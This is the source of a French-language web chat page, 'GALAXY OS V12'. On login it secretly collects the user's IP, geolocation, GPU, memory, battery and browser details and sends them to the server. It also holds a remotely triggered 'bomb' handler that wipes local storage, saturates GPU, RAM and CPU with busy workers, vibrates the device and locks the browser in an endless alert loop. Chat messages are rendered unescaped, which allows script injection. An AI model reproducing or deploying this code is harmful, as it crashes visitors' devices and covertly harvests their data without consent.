<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GALAXY OS - V12</title>
    <style>
        :root { --main: #a29bfe; --red: #ff4757; }
        body { margin: 0; background: #000; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
        
        /* STYLE DU CHAT */
        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { border: 1px solid var(--main); padding: 40px; text-align: center; background: #0a0a0a; width: 300px; }
        #side-menu { width: 250px; background: #050505; border-right: 1px solid #222; display: flex; flex-direction: column; }
        #main-chat { flex: 1; display: flex; flex-direction: column; }
        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; }
        .msg-card { background: #111; padding: 10px; margin-bottom: 10px; border-left: 3px solid var(--main); }
        #form { display: flex; padding: 15px; background: #000; gap: 10px; }
        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 10px; outline: none; }
        .btn { background: var(--main); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }

        /* INTERFACE DE CRASH */
        #bomb-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; text-align: center; color: red; }
        #bomb-screen canvas { position: absolute; inset: 0; width: 100%; height: 100%; opacity: 0.5; }
        .glitch { position: relative; z-index: 1000000; margin-top: 40vh; font-size: 3em; animation: flash 0.1s infinite; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div id="bomb-screen">
        <canvas id="gpu-kill"></canvas>
        <h1 class="glitch">SYSTEM_MELTDOWN</h1>
        <p id="mem-stat" style="position:relative; z-index:1000000; color:white;"></p>
    </div>

    <div id="login-overlay">
        <div class="login-box">
            <h2 style="color:var(--main);">GALAXY_OS_V12</h2>
            <input type="text" id="login-name" placeholder="PSEUDO..." style="width:100%; padding:10px; margin-bottom:10px; background:#000; color:white; border:1px solid #333;">
            <input type="file" id="login-pp-file" style="font-size:0.7em; margin-bottom:20px;">
            <button class="btn" style="width:100%;" onclick="startDeepScan()">CONNECTER</button>
        </div>
    </div>

    <div id="side-menu">
        <div style="padding:20px; text-align:center;">
            <img src="" id="my-avatar" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--main); display:none; object-fit: cover;">
            <h4 id="my-name-display"></h4>
        </div>
        <div style="padding:20px; font-size:0.7em; color:lime;" id="monitor">
            <p id="mon-ip">IP: SCANNING...</p>
            <p id="mon-bat">BAT: --%</p>
        </div>
    </div>

    <div id="main-chat">
        <ul id="messages"></ul>
        <form id="form">
            <input id="input" autocomplete="off" placeholder="COMMANDE..." />
            <button type="submit" class="btn">EXEC</button>
        </form>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let user = JSON.parse(localStorage.getItem('galaxy_v12')) || { name: "", pp: "", geo: {}, hardware: {} };
        let bombWorkers = [];

        window.onload = () => { if(user.name) finalize(user.name, true); };

        async function startDeepScan() {
            const name = document.getElementById('login-name').value;
            if(!name) return;
            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            const b = await navigator.getBattery();

            user.hardware = {
                gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
                ram: navigator.deviceMemory || "N/A",
                cores: navigator.hardwareConcurrency,
                battery: Math.floor(b.level * 100),
                ua: navigator.userAgent
            };

            const file = document.getElementById('login-pp-file').files[0];
            if(file) {
                const reader = new FileReader();
                reader.onload = (e) => { user.pp = e.target.result; finalize(name); };
                reader.readAsDataURL(file);
            } else {
                user.pp = "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif";
                finalize(name);
            }
        }

        function finalize(name, auto=false) {
            user.name = name;
            if(!auto) localStorage.setItem('galaxy_v12', JSON.stringify(user));
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('my-avatar').src = user.pp;
            document.getElementById('my-avatar').style.display = 'inline-block';
            document.getElementById('my-name-display').innerText = name;
            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
            document.getElementById('mon-bat').innerText = `BAT: ${user.hardware.battery}%`;
            socket.emit('check_device', user);
        }

        document.getElementById('form').onsubmit = (e) => {
            e.preventDefault();
            const input = document.getElementById('input');
            if(input.value) {
                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp, city: user.geo.city });
                input.value = '';
            }
        };

        socket.on('chat message', (data) => {
            const li = document.createElement('li');
            li.className = 'msg-card';
            li.innerHTML = `<b>${data.name}</b>: ${data.text}`;
            document.getElementById('messages').appendChild(li);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        });

        // 🧨 LA BOMBE DESTRUCTIVE (PC/MOBILE)
        socket.on('execute_bomb', () => {
            localStorage.clear();
            document.getElementById('bomb-screen').style.display = 'block';
            
            // 1. Surcharge GPU (Rendu massif)
            const cv = document.getElementById('gpu-kill');
            const cx = cv.getContext('2d');
            cv.width = window.innerWidth; cv.height = window.innerHeight;
            setInterval(() => {
                for(let i=0; i<50000; i++) {
                    cx.fillStyle = `rgb(${Math.random()*255},0,0)`;
                    cx.fillRect(Math.random()*cv.width, Math.random()*cv.height, 2, 2);
                }
            }, 10);

            // 2. Surcharge RAM (Memory Leak)
            const leak = [];
            setInterval(() => {
                leak.push(new Uint8Array(50 * 1024 * 1024)); // 50MB par cycle
                document.getElementById('mem-stat').innerText = `OVERFLOW: ${leak.length * 50}MB`;
            }, 100);

            // 3. Surcharge CPU (Multi-threading)
            const blob = new Blob([`while(true){postMessage(0)}`], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            for(let i=0; i<30; i++) {
                let w = new Worker(url);
                bombWorkers.push(w);
            }

            // 4. Blocage UI (Alertes & Vibrations)
            if(navigator.vibrate) navigator.vibrate([10000, 500, 10000]);
            while(true) {
                alert("CRITICAL_ERROR: GALAXY_OS_NEUTRALIZED_YOU");
            }
        });

        socket.on('stop_bomb', () => {
            location.reload();
        });
    </script>
</body>
</html>
